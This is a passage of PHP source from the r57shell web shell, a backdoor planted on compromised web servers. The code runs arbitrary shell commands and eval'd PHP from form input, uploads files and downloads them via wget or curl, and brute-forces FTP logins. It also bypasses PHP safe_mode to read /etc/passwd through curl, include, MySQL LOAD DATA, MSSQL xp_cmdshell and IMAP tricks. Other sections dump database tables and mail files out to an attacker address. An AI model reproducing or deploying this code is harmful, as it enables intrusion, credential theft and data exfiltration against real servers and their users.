if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=$alias_cmd;}}}
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case fetch:
 $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
 break;
 case lynx:
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case links:
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case GET:
 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case curl:
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
if(!empty($_POST['cmd']) && ($_POST['cmd']=="ftp_file_up" || $_POST['cmd']=="ftp_file_down"))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { fe($language,0); }
 else
  {
  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }
  else
   {
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.(($windows)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);	}
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);	}
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { fe($language,0); $_POST['cmd'] = ""; }
 else if(!$users=get_users()) { echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 @ftp_close($connection);
 }
echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";
if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if($windows){
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
   }
  else echo $lang[$language._text29];
 break;
 case 'safe_file':
  if(@is_file($_POST['file']))
   {
   $file = @file($_POST['file']);
   if($file)
    {
    $c = @sizeof($file);
    for($i=0;$i<$c;$i++) { echo htmlspecialchars($file[$i]); }
    }
   else echo $lang[$language._text29];
   }
  else echo $lang[$language._text31];
  break;
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test3':
  if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
     $sql = "CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );";
     @mysql_query($sql);
     $sql = "LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table;";
     @mysql_query($sql);
     $sql = "SELECT * FROM temp_r57_table;";
     $r = @mysql_query($sql);
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0]); }
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
  break;
  case 'test4':
  if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table r57_temp_table",$db);
     @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from r57_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo $row[0]."\r\n";
      }
    @mssql_query("drop table r57_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'test5':
  if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');
  $extra = "-C ".$_POST['test5_file']." -X /tmp/mb_send_mail";
  @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
  $lines = file ('/tmp/mb_send_mail');
  foreach ($lines as $line) { echo htmlspecialchars($line)."\r\n"; }
  break;
  case 'test6':
  $stream = @imap_open('/etc/passwd', "", "");
  $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
  for ($i = 0; $i < count($dir_list); $i++) echo $dir_list[$i]."\r\n";
  @imap_close($stream);
  break;
  case 'test7':
  $stream = @imap_open($_POST['test7_file'], "", "");
  $str = @imap_body($stream, 1);
  echo $str;
  @imap_close($stream);
  break;
 }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}
if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 foreach($users as $user)
  {
  $connection = @ftp_connect($ftp_server,$ftp_port,10);
  if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } }
  @ftp_close($connection);
  }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse'])) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);}
if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  $sql = new my_sql();
  $sql->db   = $_POST['db'];
  $sql->host = $_POST['db_server'];
  $sql->port = $_POST['db_port'];
  $sql->user = $_POST['mysql_l'];
  $sql->pass = $_POST['mysql_p'];
  $sql->base = $_POST['mysql_db'];
  if(!$sql->connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
  else if(!$sql->select_db()) { echo "[-] ERROR! Can't select database"; }
  else if(!$sql->dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
  else {
   if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v."\r\n"; }
   else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v."\r\n"); }
   else { echo "[-] ERROR! Can't write in dump file"; }
   }
 }
echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<table width=100% cellpadding=0 cellspacing=0>";
function up_down($id)
 {
 global $lang;
 global $language;
 return '&nbsp<img src='.$_SERVER['PHP_SELF'].'?img=1 onClick="document.getElementById(\''.$id.'\').style.display = \'none\'; document.cookie=\''.$id.'=0;\';" title="'.$lang[$language.'_text109'].'"><img src='.$_SERVER['PHP_SELF'].'?img=2 onClick="document.getElementById(\''.$id.'\').style.display = \'block\'; document.cookie=\''.$id.'=1;\';" title="'.$lang[$language.'_text110'].'">';
 }
function div($id)
 {
 if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id="'.$id.'" style="display: none;">';
 return '<div id="'.$id.'">';
 }
if(!$safe_mode){
echo $fs.$table_up1.$lang[$language.'_text2'].up_down('id1').$table_up2.div('id1').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd',85,''));
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
else{
echo $fs.$table_up1.$lang[$language.'_text28'].up_down('id2').$table_up2.div('id2').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text42'].up_down('id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'</div>'.$table_end1.$fe;
if($safe_mode){
echo $fs.$table_up1.$lang[$language.'_text57'].up_down('id4').$table_up2.div('id4').$ts;
echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode && $unix){
echo $fs.$table_up1.$lang[$language.'_text67'].up_down('id5').$table_up2.div('id5').$ts;
echo sr(15,"<b>".$lang[$language.'_text68'].$arrow."</b>","<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>".ws(2)."<b>".$lang[$language.'_text69'].$arrow."</b>".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."<b>".$lang[$language.'_text70'].$arrow."</b>".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
if(!$safe_mode){
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 $aliases2 .= "<option>$alias_name</option>";
 }
echo $fs.$table_up1.$lang[$language.'_text7'].up_down('id6').$table_up2.div('id6').$ts;
echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text54'].up_down('id7').$table_up2.div('id7').$ts;
echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
if(!$safe_mode && $unix){
echo $fs.$table_up1.$lang[$language.'_text76'].up_down('id8').$table_up2.div('id8').$ts;
echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text32'].up_down('id9').$table_up2.$font;
echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "</div></div></font>";
echo $table_end1.$fe;
if($safe_mode&&$curl_on)
{
echo $fs.$table_up1.$lang[$language.'_text33'].up_down('id10').$table_up2.div('id10').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.$lang[$language.'_text34'].up_down('id11').$table_up2.div('id11').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&$mysql_on)
{
echo $fs.$table_up1.$lang[$language.'_text35'].up_down('id12').$table_up2.div('id12').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&$mssql_on)
{
echo $fs.$table_up1.$lang[$language.'_text85'].up_down('id13').$table_up2.div('id13').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&$unix&&function_exists('mb_send_mail')){
echo $fs.$table_up1.$lang[$language.'_text112'].up_down('id22').$table_up2.div('id22').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_list')){
echo $fs.$table_up1.$lang[$language.'_text113'].up_down('id23').$table_up2.div('id23').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_body')){
echo $fs.$table_up1.$lang[$language.'_text114'].up_down('id24').$table_up2.div('id24').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if(@ini_get('file_uploads')){
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.$lang[$language.'_text5'].up_down('id14').$table_up2.div('id14').$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile',85,''));
echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}
if(!$safe_mode&&!$windows){
echo $fs.$table_up1.$lang[$language.'_text15'].up_down('id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text86'].up_down('id16').$table_up2.div('id16').$ts;
echo sr(15,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none').' '.$arh);
echo $te.'</div>'.$table_end1.$fe;
if(@function_exists("ftp_connect")){
echo $table_up1.$lang[$language.'_text93'].up_down('id17').$table_up2.div('id17').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text87']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text100']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));
echo $te."</td>".$fe."</tr></div></table>";
}
if($unix && @function_exists("ftp_connect")){
echo $fs.$table_up1.$lang[$language.'_text94'].up_down('id18').$table_up2.div('id18').$ts;
echo sr(15,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo sr(15,"","<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href=".$_SERVER['PHP_SELF']."?users>".$lang[$language.'_text95']."</a> )</font>");
echo sr(15,"",in('checkbox','reverse id=reverse',0,'1').$lang[$language.'_text101']);
echo $te.'</div>'.$table_end1.$fe;
}
if(@function_exists("mail")){
echo $table_up1.$lang[$language.'_text102'].up_down('id19').$table_up2.div('id19').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text103']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=33 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text104']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from r57shell"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none').' '.$arh);
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."</td>".$fe."</tr></div></table>";
}
if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
$select = '<select name=db>';
if($mysql_on) $select .= '<option>MySQL</option>';
if($mssql_on) $select .= '<option>MSSQL</option>';
if($pg_on)    $select .= '<option>PostgreSQL</option>';
if($ora_on)   $select .= '<option>Oracle</option>';
$select .= '</select>';
echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text40']."</div></b></font>";
echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";
echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
